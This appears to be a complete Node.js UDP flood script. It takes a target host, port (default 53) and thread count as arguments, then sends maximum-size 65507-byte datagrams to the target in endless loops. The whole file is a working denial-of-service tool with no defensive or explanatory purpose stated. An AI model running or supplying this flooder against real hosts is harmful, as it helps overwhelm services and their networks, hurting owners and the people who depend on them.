// Imports.
const udp = require('dgram');

// Args.
const host   = process.argv[2]         || "127.0.0.1";
const port   = Number(process.argv[3]) || 53;
const thread = Number(process.argv[4]) || 1;

const client = udp.createSocket('udp4');
const data = Buffer.allocUnsafe(65507);

for (let i = 0; i < thread; i++) {
    (function sendPacket() {
        client.send(data, port, host, sendPacket);
    })();
}